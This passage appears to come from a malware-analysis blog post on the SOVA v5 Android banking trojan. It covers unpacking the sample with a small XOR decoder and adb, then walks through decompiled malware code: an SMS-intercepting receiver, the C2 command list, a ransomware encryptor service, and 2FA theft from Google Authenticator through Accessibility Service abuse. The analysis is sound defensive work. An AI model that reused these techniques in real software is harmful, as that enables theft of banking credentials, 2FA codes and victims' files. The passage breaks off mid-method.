<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="n">receiver</span> <span class="n">android</span><span class="p">:</span><span class="n">enabled</span><span class="p">=</span><span class="s">"true"</span> <span class="n">android</span><span class="p">:</span><span class="n">exported</span><span class="p">=</span><span class="s">"true"</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"com.devapprove.a.ru.news.SmsReceiver"</span> <span class="n">android</span><span class="p">:</span><span class="n">permission</span><span class="p">=</span><span class="s">"android.permission.BROADCAST_SMS"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span> <span class="n">android</span><span class="p">:</span><span class="n">priority</span><span class="p">=</span><span class="s">"9999"</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="n">action</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.provider.Telephony.SMS_DELIVER"</span><span class="p">/&gt;</span>
            <span class="p">&lt;/</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="n">receiver</span><span class="p">&gt;</span>
</code></pre></div></div>

<h1 id="dive-into-packed-classesex">Dive into packed classes.ex</h1>

<p>Now after we know that the malware is packed which will drop the unpacked file which contains the malicious functions the malware will do to the victim’s device.  Another indication of packing by using <a href="https://github.com/cryptax/droidlysis">droidlysis</a> tool which extracts properties about the app.<code class="language-plaintext highlighter-rouge"> droidlysis --input 7c805f51ee3b2994e742d73954e51d7c2c24c76455b0b9a1b44d61cb4e280502.apk</code>. We get lots of info about the app such as activities, permissions, urls, and suspecious classes.</p>

<p>Suspicious classes such as <code class="language-plaintext highlighter-rouge">DexClassLoader</code> which is A class loader that loads classes from .<code class="language-plaintext highlighter-rouge">jar</code> and <code class="language-plaintext highlighter-rouge">.apk</code> files containing a classes.dex entry. This can be used to execute code not installed as part of an application. The most important parameter the <code class="language-plaintext highlighter-rouge">DexClassLoader</code> is the first parameter <code class="language-plaintext highlighter-rouge">dexPath</code> which represent path to the unpacked dex. We will get the name of the encrypted file which will be loaded at runtime. The name will be in <code class="language-plaintext highlighter-rouge">plaintext</code> or will be <code class="language-plaintext highlighter-rouge">encoded</code>, we will see….</p>
<p align="center">
  <img src="/assets/images/MA/sova/1.png" />
</p>
<center><font size="3"> <u>Figure</u>(1): DexClassLoader class<u></u> </font></center>
<p><br /></p>

<p>How we will find this file?</p>

<p>You can see the Unpacking video from <a href="https://youtu.be/SgRKhsVq9pM">Here</a></p>

<p>First search for <code class="language-plaintext highlighter-rouge">DexClassLoader</code> in the decompiler such as <code class="language-plaintext highlighter-rouge">jadx-gui</code>. Then the find reference by pressing <code class="language-plaintext highlighter-rouge">x</code> to class, and keep finding reference until finding <code class="language-plaintext highlighter-rouge">attachBaseContext</code> method, which is the function that packers usually override to perform these tasks since it is called by the framework even before.</p>

<p>After searching for <code class="language-plaintext highlighter-rouge">DexClassLoader</code>, we find <code class="language-plaintext highlighter-rouge">uncovercherry</code> class we use <code class="language-plaintext highlighter-rouge">x</code> to find reference to this class.</p>
<p align="center">
  <img src="/assets/images/MA/sova/2.png" />
</p>
<center><font size="3"> <u>Figure</u>(2): DexClassLoader class and uncovercherry<u></u> </font></center>
<p align="center">
  <img src="/assets/images/MA/sova/3.png" />
</p>
<center><font size="3"> <u>Figure</u>(3): find ref to uncovercherry is vibrantcricket<u></u> </font></center>
<p align="center">
  <img src="/assets/images/MA/sova/4.png" />
</p>
<center><font size="3"> <u>Figure</u>(4): find ref to vibrantcricket is damageinform<u></u> </font></center>
<p align="center">
  <img src="/assets/images/MA/sova/5.png" />
</p>
<center><font size="3"> <u>Figure</u>(5):  find ref to damageinform is decreasespare<u></u> </font></center>
<p align="center">
  <img src="/assets/images/MA/sova/6.png" />
</p>
<center><font size="3"> <u>Figure</u>(6): find ref to decreasespare is attachBaseContext <u></u> </font></center>

<p>Now we find <code class="language-plaintext highlighter-rouge">String dexpath = nobleamong(clusterhole);</code>, we enter <code class="language-plaintext highlighter-rouge">nobleamong</code> class, then we get <code class="language-plaintext highlighter-rouge">return nuclearinquiry(str);</code>, enter <code class="language-plaintext highlighter-rouge">nuclearinquiry</code>, then <code class="language-plaintext highlighter-rouge">inflictair</code>. We get <code class="language-plaintext highlighter-rouge">return new File(str, this.REpOzCiHoGjQpWpQqNnBtIu);</code>, enter <code class="language-plaintext highlighter-rouge">REpOzCiHoGjQpWpQqNnBtIu</code>, and then <code class="language-plaintext highlighter-rouge">ketchupold</code>, then <code class="language-plaintext highlighter-rouge">globeonline</code>.</p>

<p>Now, in this class we will get the name of the encrypted file which will be loaded in runtime. But it seems to be encoded, so we need to write code to decode it.
The code is full of junk code, we will try to clean it.</p>
<p align="center">
  <img src="/assets/images/MA/sova/7.png" />
</p>
<center><font size="3"> <u>Figure</u>(7): encoded name of encrypted file <u></u> </font></center>

<p>After cleaning the code, and run the code the result will be <code class="language-plaintext highlighter-rouge">Decoded filename: CtaDwII.json</code>. So the file name will be <code class="language-plaintext highlighter-rouge">CtaDwII.json</code>.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">class</span> <span class="nc">Main</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">String</span> <span class="nf">lawtwist</span><span class="p">(</span><span class="kt">int</span> <span class="n">arg9</span><span class="p">)</span> <span class="p">{</span>
          <span class="kt">byte</span><span class="p">[]</span> <span class="n">encrypted</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[]</span> <span class="p">{</span><span class="m">80</span><span class="p">,</span> <span class="m">103</span><span class="p">,</span> <span class="m">114</span><span class="p">,</span> <span class="m">87</span><span class="p">,</span> <span class="m">100</span><span class="p">,</span> <span class="m">90</span><span class="p">,</span> <span class="m">90</span><span class="p">,</span> <span class="m">61</span><span class="p">,</span> <span class="m">121</span><span class="p">,</span> <span class="m">96</span><span class="p">,</span> <span class="m">124</span><span class="p">,</span> <span class="m">125</span><span class="p">};</span>
          <span class="kt">byte</span><span class="p">[]</span> <span class="n">result</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">12</span><span class="p">];</span>
          <span class="kt">byte</span><span class="p">[]</span> <span class="n">key</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[]{</span><span class="m">19</span><span class="p">};</span>
  
          <span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
          <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="p">&lt;</span> <span class="m">12</span><span class="p">)</span> <span class="p">{</span>
              <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(</span> <span class="n">encrypted</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="p">%</span> <span class="m">1</span><span class="p">]);</span>
              <span class="n">i</span><span class="p">++;</span>
          <span class="p">}</span>
          <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
         
          <span class="p">}</span>
	<span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">System</span><span class="p">.</span><span class="k">out</span><span class="p">.</span><span class="nf">println</span><span class="p">(</span><span class="s">"Decoded filename: "</span><span class="p">+</span> <span class="n">Main</span><span class="p">.</span><span class="nf">lawtwist</span><span class="p">(</span><span class="m">0</span> <span class="cm">/* whatever */</span><span class="p">));</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Now how we will get the file? We will run the APK in virtual environment such as <code class="language-plaintext highlighter-rouge">android studio</code> then we use <code class="language-plaintext highlighter-rouge">adb</code> to pull the decrypted file.</p>

<p>So we need to know where the decrypted <code class="language-plaintext highlighter-rouge">CtaDwII.json</code> file will be unpacked in <code class="language-plaintext highlighter-rouge">android studio</code>, you can use <a href="https://github.com/FrenchYeti/dexcalibur">Dexcalibur</a> but I have problems while installing, so I used <a href="https://tria.ge/220812-jen4nschf5/behavioral1#report">Hatching triage report</a> to locate the decrypted <code class="language-plaintext highlighter-rouge">CtaDwII.json</code> file. The file is located in <code class="language-plaintext highlighter-rouge">/data/user/0/com.bean.cousin/app_DynamicOptDex/CtaDwII.json</code>. before we pull the file, you need to copy <code class="language-plaintext highlighter-rouge">CtaDwII.json</code> to a user folder not root folder such as <code class="language-plaintext highlighter-rouge">/sdcard/</code> then pull this dex file which we will analyze instead of <code class="language-plaintext highlighter-rouge">classes.dex</code>. The decrypted <code class="language-plaintext highlighter-rouge">CtaDwII.json</code> file SHA256 hash: <code class="language-plaintext highlighter-rouge">f6776bddb6a62dfaabcdf46eb1d5e22374ba0cfbabc45915ba887637b2f28c71</code>.</p>

<h1 id="dive-into-droped-dex">Dive into droped dex</h1>

<p>SOVA malware has multible versions, in each version malware authors implements new features. This sample is SOVA v5. And new features got added such as ransomware capability with AES algorithm.</p>

<p>In <code class="language-plaintext highlighter-rouge">Const</code> method, we get all the capabilities of the malware. The malware can do malicious functions such as intercepting 2FA, delete app, steal SMS and contacts, forward calls, keylogger ,or mute the device. In the end, I will explain in brief every function the malware does.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">Const</span><span class="p">.</span><span class="n">INSTANCE</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Const</span><span class="p">();</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">PERMISSION_LIST</span> <span class="p">=</span> <span class="n">Build</span><span class="p">.</span><span class="n">VERSION</span><span class="p">.</span><span class="n">SDK_INT</span> <span class="p">&lt;</span> <span class="m">26</span> <span class="p">?</span> <span class="n">CollectionsKt</span><span class="p">.</span><span class="nf">listOf</span><span class="p">(</span><span class="k">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s">"android.permission.READ_SMS"</span><span class="p">,</span> <span class="s">"android.permission.SEND_SMS"</span><span class="p">,</span> <span class="s">"android.permission.RECEIVE_SMS"</span><span class="p">,</span> <span class="s">"android.permission.READ_CONTACTS"</span><span class="p">,</span> <span class="s">"android.permission.WRITE_CONTACTS"</span><span class="p">,</span> <span class="s">"android.permission.READ_PHONE_STATE"</span><span class="p">})</span> <span class="p">:</span> <span class="n">CollectionsKt</span><span class="p">.</span><span class="nf">listOf</span><span class="p">(</span><span class="k">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s">"android.permission.READ_SMS"</span><span class="p">,</span> <span class="s">"android.permission.SEND_SMS"</span><span class="p">,</span> <span class="s">"android.permission.RECEIVE_SMS"</span><span class="p">,</span> <span class="s">"android.permission.READ_CONTACTS"</span><span class="p">,</span> <span class="s">"android.permission.WRITE_CONTACTS"</span><span class="p">,</span> <span class="s">"android.permission.READ_PHONE_STATE"</span><span class="p">,</span> <span class="s">"android.permission.WRITE_EXTERNAL_STORAGE"</span><span class="p">,</span> <span class="s">"android.permission.MODIFY_AUDIO_SETTINGS"</span><span class="p">,</span> <span class="s">"android.permission.READ_EXTERNAL_STORAGE"</span><span class="p">,</span> <span class="s">"android.permission.INSTALL_PACKAGES"</span><span class="p">,</span> <span class="s">"android.permission.CALL_PHONE"</span><span class="p">,</span> <span class="s">"android.permission.GET_ACCOUNTS"</span><span class="p">,</span> <span class="s">"android.permission.READ_PHONE_NUMBERS"</span><span class="p">,</span> <span class="s">"android.permission.CLEAR_APP_CACHE"</span><span class="p">});</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">get2fa</span> <span class="p">=</span> <span class="s">"get2fa"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">start2faactivator</span> <span class="p">=</span> <span class="s">"start2faactivator"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">stop2faactivator</span> <span class="p">=</span> <span class="s">"stop2faactivator"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">delbot</span> <span class="p">=</span> <span class="s">"delbot"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">openUrl</span> <span class="p">=</span> <span class="s">"openurl"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">startlock</span> <span class="p">=</span> <span class="s">"startlock"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">stoplock</span> <span class="p">=</span> <span class="s">"stoplock"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">admin</span> <span class="p">=</span> <span class="s">"getperm"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">delapp</span> <span class="p">=</span> <span class="s">"delapp"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">starthidenpush</span> <span class="p">=</span> <span class="s">"starthidenpush"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">stophidenpush</span> <span class="p">=</span> <span class="s">"stophidenpush"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">hidesms</span> <span class="p">=</span> <span class="s">"starthidesms"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">stophidensms</span> <span class="p">=</span> <span class="s">"stophidesms"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">scancookie</span> <span class="p">=</span> <span class="s">"scancookie"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">stopcookie</span> <span class="p">=</span> <span class="s">"stopcookie"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">scaninject</span> <span class="p">=</span> <span class="s">"scaninject"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">stopscan</span> <span class="p">=</span> <span class="s">"stopscan"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">getsms</span> <span class="p">=</span> <span class="s">"getsms"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">startkeylogs</span> <span class="p">=</span> <span class="s">"startkeylogs"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">stopkeylogs</span> <span class="p">=</span> <span class="s">"stopkeylogs"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">contactssender</span> <span class="p">=</span> <span class="s">"contactssender"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">sendsms</span> <span class="p">=</span> <span class="s">"sendsms"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">openinject</span> <span class="p">=</span> <span class="s">"openinject"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">getapps</span> <span class="p">=</span> <span class="s">"getapps"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">sendpush</span> <span class="p">=</span> <span class="s">"sendpush"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">enableinject</span> <span class="p">=</span> <span class="s">"enableinject"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">runapp</span> <span class="p">=</span> <span class="s">"runapp"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">callForward</span> <span class="p">=</span> <span class="s">"forwardcall"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">call</span> <span class="p">=</span> <span class="s">"call"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">disableinject</span> <span class="p">=</span> <span class="s">"disableinject"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">getcontacts</span> <span class="p">=</span> <span class="s">"getcontacts"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">startMute</span> <span class="p">=</span> <span class="s">"startmute"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">stopMute</span> <span class="p">=</span> <span class="s">"stopmute"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">gettrustwallet</span> <span class="p">=</span> <span class="s">"gettrustwallet"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">getexodus</span> <span class="p">=</span> <span class="s">"getexodus"</span><span class="p">;</span>
        <span class="n">Const</span><span class="p">.</span><span class="n">remote</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Remote</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">7</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
    
</code></pre></div></div>

<p>Now I will start explaining the major functions of the malware such as Stealing SMS and contacts, ransomware, intercept 2FA, overlay attack, forward call, and mute state. In <code class="language-plaintext highlighter-rouge">PingTasks</code> method, we will find commands from C2 server which will be received to the malware to do the malicous functions. We will show the command from the C2 server and then explain the function of the command.</p>

<p>In this version of SOVA, the malware comes with ransomware capability which will encrypt the victim’s files with AES algorithm and the extenstion of the encrypted files will be <code class="language-plaintext highlighter-rouge">.enc</code>.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">public</span> <span class="k">void</span> <span class="nf">onCreate</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="s">"Created encryptor service"</span><span class="p">,</span> <span class="s">"TDE(\"Created encryptor service\")"</span><span class="p">);</span>
        <span class="n">RemoteLogger</span><span class="p">.</span><span class="n">log</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">logger</span><span class="p">,</span> <span class="s">"Created encryptor service"</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">14</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
        <span class="n">super</span><span class="p">.</span><span class="nf">onCreate</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// android.app.Service</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onDestroy</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">super</span><span class="p">.</span><span class="nf">onDestroy</span><span class="p">();</span>
        <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="s">"Destroyed encryptor service"</span><span class="p">,</span> <span class="s">"TDE(\"Destroyed encryptor service\")"</span><span class="p">);</span>
        <span class="n">RemoteLogger</span><span class="p">.</span><span class="n">log</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">logger</span><span class="p">,</span> <span class="s">"Destroyed encryptor service"</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">14</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="n">final</span> <span class="k">void</span> <span class="nf">onEncryptionEnd</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="s">"Stopped encryptor"</span><span class="p">,</span> <span class="s">"TDE(\"Stopped encryptor\")"</span><span class="p">);</span>
        <span class="n">RemoteLogger</span><span class="p">.</span><span class="n">log</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">logger</span><span class="p">,</span> <span class="s">"Stopped encryptor"</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">14</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">preferences</span><span class="p">.</span><span class="nf">isDeviceEncrypted</span><span class="p">(</span><span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="k">true</span><span class="p">));</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">stopForeground</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">stopSelf</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="n">final</span> <span class="k">void</span> <span class="nf">onEncryptionStart</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">((</span><span class="n">Preferences</span><span class="p">.</span><span class="n">isDeviceEncrypted</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">preferences</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">1</span><span class="p">,</span> <span class="k">null</span><span class="p">))</span> <span class="p">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="n">mode</span> <span class="p">==</span> <span class="n">WorkType</span><span class="p">.</span><span class="n">ENCRYPT</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="s">"Device already encrypted"</span><span class="p">,</span> <span class="s">"TDE(\"Device already encrypted\")"</span><span class="p">);</span>
            <span class="n">RemoteLogger</span><span class="p">.</span><span class="n">log</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">logger</span><span class="p">,</span> <span class="s">"Device already encrypted"</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">14</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">stopForeground</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">stopSelf</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="s">"Started encryptor"</span><span class="p">,</span> <span class="s">"TDE(\"Started encryptor\")"</span><span class="p">);</span>
        <span class="n">RemoteLogger</span><span class="p">.</span><span class="n">log</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">logger</span><span class="p">,</span> <span class="s">"Started encryptor"</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">14</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
        <span class="n">Function1</span> <span class="n">function10</span> <span class="p">=</span> <span class="p">(</span><span class="n">Function1</span><span class="p">)</span><span class="k">new</span> <span class="n">EncryptorService</span><span class="p">.</span><span class="n">onEncryptionStart</span><span class="p">.</span><span class="m">1</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">aesEncryptor</span><span class="p">.</span><span class="nf">setLog</span><span class="p">(</span><span class="n">function10</span><span class="p">);</span>
        <span class="n">BuildersKt__Builders_commonKt</span><span class="p">.</span><span class="n">launch</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="n">CoroutineScopeKt</span><span class="p">.</span><span class="nf">CoroutineScope</span><span class="p">(((</span><span class="n">CoroutineContext</span><span class="p">)</span><span class="n">Dispatchers</span><span class="p">.</span><span class="nf">getIO</span><span class="p">())),</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="p">((</span><span class="n">Function2</span><span class="p">)</span><span class="k">new</span> <span class="n">EncryptorService</span><span class="p">.</span><span class="n">onEncryptionStart</span><span class="p">.</span><span class="m">2</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">)),</span> <span class="m">3</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// android.app.Service</span>
    <span class="k">public</span> <span class="kt">int</span> <span class="nf">onStartCommand</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">startForeground</span><span class="p">(</span><span class="m">3</span><span class="p">,</span> <span class="n">ContextNotificationExtensions</span><span class="p">.</span><span class="n">INSTANCE</span><span class="p">.</span><span class="nf">createManagingServiceNotification</span><span class="p">(((</span><span class="n">Context</span><span class="p">)</span><span class="k">this</span><span class="p">)));</span>
        <span class="k">this</span><span class="p">.</span><span class="n">mode</span> <span class="p">=</span> <span class="n">intent0</span> <span class="p">==</span> <span class="k">null</span> <span class="p">||</span> <span class="p">!</span><span class="n">intent0</span><span class="p">.</span><span class="nf">getBooleanExtra</span><span class="p">(</span><span class="s">"decrypt"</span><span class="p">,</span> <span class="k">false</span><span class="p">)</span> <span class="p">?</span> <span class="n">WorkType</span><span class="p">.</span><span class="n">ENCRYPT</span> <span class="p">:</span> <span class="n">WorkType</span><span class="p">.</span><span class="n">DECRYPT</span><span class="p">;</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">onEncryptionStart</span><span class="p">();</span>
        <span class="k">return</span> <span class="m">1</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>The malware will receive a command related to two factor authentication <code class="language-plaintext highlighter-rouge">2FA</code> to start or stop collecting 2FA authentication codes from victim device then send 2FA message to the C2 server. The malware will run the <code class="language-plaintext highlighter-rouge">Google Authenticator</code> app and get the content of the opened interface by abusing <code class="language-plaintext highlighter-rouge">Accessibility Service</code>.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"start2faactivator"</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">preferences0</span><span class="p">.</span><span class="nf">is2FAActivatorEnabled</span><span class="p">(</span><span class="n">boolean0</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">Inject</span> <span class="n">inject0</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"stop2faactivator"</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">Log</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="s">"2FA"</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">Preferences</span><span class="p">.</span><span class="n">is2FAActivatorEnabled</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="n">preferences0</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">1</span><span class="p">,</span> <span class="k">null</span><span class="p">)));</span>
            <span class="n">preferences0</span><span class="p">.</span><span class="nf">is2FAActivatorEnabled</span><span class="p">(</span><span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="k">false</span><span class="p">));</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"get2fa"</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">AppKt</span><span class="p">.</span><span class="n">log</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="s">"Request Google auth app"</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">6</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(!</span><span class="n">workerService1</span><span class="p">.</span><span class="nf">checkScreenState</span><span class="p">(</span><span class="n">command0</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">if</span><span class="p">(</span><span class="n">ContexStartExtensionsKt</span><span class="p">.</span><span class="nf">startApp</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="s">"com.google.android.apps.authenticator2"</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">preferences0</span><span class="p">.</span><span class="nf">is2FARequested</span><span class="p">(</span><span class="n">boolean0</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>The malware will try to steal 2FA codes generated by <code class="language-plaintext highlighter-rouge">Google Authenticator</code> app. This can happen if the malware take <code class="language-plaintext highlighter-rouge">Accessibility Service</code> permission. If the authenticator app is running, the malware can get the content of the opened activity(interface) and then upload this information to the C2 server. By this way, the malware can get the 2FA to bypass the protection of the banking accounts.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="n">final</span> <span class="n">boolean</span> <span class="nf">is2FAActivatorEnabled</span><span class="p">(</span><span class="n">Boolean</span> <span class="n">boolean0</span><span class="p">)</span> <span class="p">{</span>
